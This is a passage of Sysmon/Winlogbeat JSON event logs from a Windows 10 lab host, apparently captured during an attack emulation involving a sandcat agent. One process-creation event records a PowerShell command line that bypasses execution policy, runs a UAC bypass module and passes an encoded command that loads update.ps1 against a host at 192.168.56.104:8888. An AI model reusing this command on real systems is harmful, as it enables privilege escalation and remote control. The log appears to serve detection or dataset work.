WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5344,"thread":{"id":1692},"entity_id":"{04787c88-f96f-623a-ea00-000000000c00}","executable":"C:\\Users\\Public\\sandcat.go-windows.exe","name":"sandcat.go-windows.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"10","api":"wineventlog","record_id":8620,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:58:38.915Z","code":"10"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:37.259Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Image loaded:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 10:58:37.259\nProcessGuid: {04787c88-fd5d-623a-6301-000000000c00}\nProcessId: 5176\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nImageLoaded: C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6b621f0fd6cc913157b16d8a0cfdc3ec\\System.Management.Automation.ni.dll\nFileVersion: 10.0.18362.145\nDescription: System.Management.Automation\nProduct: Microsoft (R) Windows (R) Operating System\nCompany: Microsoft Corporation\nOriginalFileName: System.Management.Automation.dll\nHashes: SHA1=A03FCAE0C1F4BC4A81F0819DBB94289C373B1052,MD5=B18E1C187DAEB6C9B195BDD2EFDC20C7,SHA256=D36AD842C5E44483BDBBDF13D045AD5A64A9DDD5C1BAB89E81B12299D89DFC27,IMPHASH=00000000000000000000000000000000\nSigned: false\nSignature: -\nSignatureStatus: Unavailable\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5176,"thread":null,"entity_id":"{04787c88-fd5d-623a-6301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"7","api":"wineventlog","record_id":8621,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:58:38.915Z","code":"7"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:37.290Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 10:58:37.290\nProcessGuid: {04787c88-fd5d-623a-6301-000000000c00}\nProcessId: 5176\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKU\\S-1-5-21-1265589927-3242731326-451682020-1000\\Software\\Microsoft\\SystemCertificates\\Root\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5176,"thread":null,"entity_id":"{04787c88-fd5d-623a-6301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8622,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:58:38.915Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:37.290Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 10:58:37.290\nProcessGuid: {04787c88-fd5d-623a-6301-000000000c00}\nProcessId: 5176\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5176,"thread":null,"entity_id":"{04787c88-fd5d-623a-6301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8623,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:58:38.915Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:37.290Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 10:58:37.290\nProcessGuid: {04787c88-fd5d-623a-6301-000000000c00}\nProcessId: 5176\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5176,"thread":null,"entity_id":"{04787c88-fd5d-623a-6301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8624,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:58:38.915Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:37.306Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 10:58:37.306\nProcessGuid: {04787c88-fd5d-623a-6301-000000000c00}\nProcessId: 5176\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Temp\\__PSScriptPolicyTest_rtbodqmo.mxf.ps1\nCreationUtcTime: 2022-03-23 10:58:37.306\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5176,"thread":null,"entity_id":"{04787c88-fd5d-623a-6301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":8625,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:58:38.915Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:37.337Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File Delete archived:\nRuleName: -\nUtcTime: 2022-03-23 10:58:37.337\nProcessGuid: {04787c88-fd5d-623a-6301-000000000c00}\nProcessId: 5176\nUser: WIN10\\vagrant\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Temp\\__PSScriptPolicyTest_rtbodqmo.mxf.ps1\nHashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000\nIsExecutable: false\nArchived: true","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5176,"thread":null,"entity_id":"{04787c88-fd5d-623a-6301-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"23","api":"wineventlog","record_id":8626,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":null},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:58:38.915Z","code":"23"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:38.665Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 10:58:38.665\nProcessGuid: {04787c88-fd5e-623a-6901-000000000c00}\nProcessId: 6500\nImage: C:\\Windows\\System32\\WerFault.exe\nFileVersion: 10.0.18362.418 (WinBuild.160101.0800)\nDescription: Windows Problem Reporting\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: WerFault.exe\nCommandLine: C:\\Windows\\system32\\WerFault.exe -u -p 5176 -s 3188\nCurrentDirectory: C:\\Windows\\system32\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=D0E61AB2E4843104C53091B4AD0E71DAC5299995,MD5=10CA9F44DD7B86C5FCE9FADB08753A81,SHA256=0F4EA772C2C9267E4C5B98A13E4D80122CCF020678689E4AEC453E69128915CC,IMPHASH=F0A0D16C6A86A14BA12D20EFC9A7DDF9\nParentProcessGuid: {04787c88-fd5d-623a-6301-000000000c00}\nParentProcessId: 5176\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;Move-Item -Path .\\update.ps1 -Destination $env:APPDATA -Force;$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\\\"Import-Module $env:APPDATA\\update.ps1;update('http://192.168.56.104:8888')\\\"));Invoke-BypassUACTokenManipulation -Arguments \\\"-nop -exec bypass -EncodedCommand $pcode\\\" -Verbose\"\nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6500,"thread":null,"entity_id":"{04787c88-fd5e-623a-6901-000000000c00}","executable":"C:\\Windows\\System32\\WerFault.exe","name":"WerFault.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8627,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:58:39.930Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:58:38.726Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process accessed:\nRuleName: technique_id=T1003,technique_name=Credential Dumping\nUtcTime: 2022-03-23 10:58:38.726\nSourceProcessGUID: {04787c88-fd5e-623a-6901-000000000c00}\nSourceProcessId: 6500\nSourceThreadId: 4116\nSourceImage: C:\\Windows\\system32\\WerFault.exe\nTargetProcessGUID: {04787c88-fd5d-623a-6301-000000000c00}\nTargetProcessId: 5176\nTargetImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c584|C:\\Windows\\SYSTEM32\\ntdll.dll+74c27|C:\\Windows\\system32\\dbghelp.dll+10ea0|C:\\Windows\\system32\\dbghelp.dll+16931|C:\\Windows\\system32\\dbghelp.dll+1134e|C:\\Windows\\system32\\faultrep.dll+1ec27|C:\\Windows\\system32\\faultrep.dll+1f00c|C:\\Windows\\system32\\faultrep.dll+e349|C:\\Windows\\system32\\faultrep.dll+f9af|C:\\Windows\\system32\\faultrep.dll+d383|C:\\Windows\\system32\\faultrep.dll+d2da|C:\\Windows\\system32\\faultrep.dll+ba78|C:\\Windows\\system32\\WerFault.exe+2c7ea|C:\\Windows\\system32\\WerFault.exe+4345|C:\\Windows\\system32\\WerFault.exe+480dd|C:\\Windows\\System32\\KERNEL32.DLL+17bd4|C:\\Windows\\SYSTEM32\\ntdll.dll+6ced1\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6500,"thread":{"id":4116},"entity_id":"{04787c88-fd5e-623a-6901-000000000c00}","executable":"C:\\Windows\\system32\\WerFault.exe","name":"WerFault.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"10","api":"wineventlog","record_id":8628,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:58:39.931Z","code":"10"},"log":{"level":"information"},"verdict":"Benign"},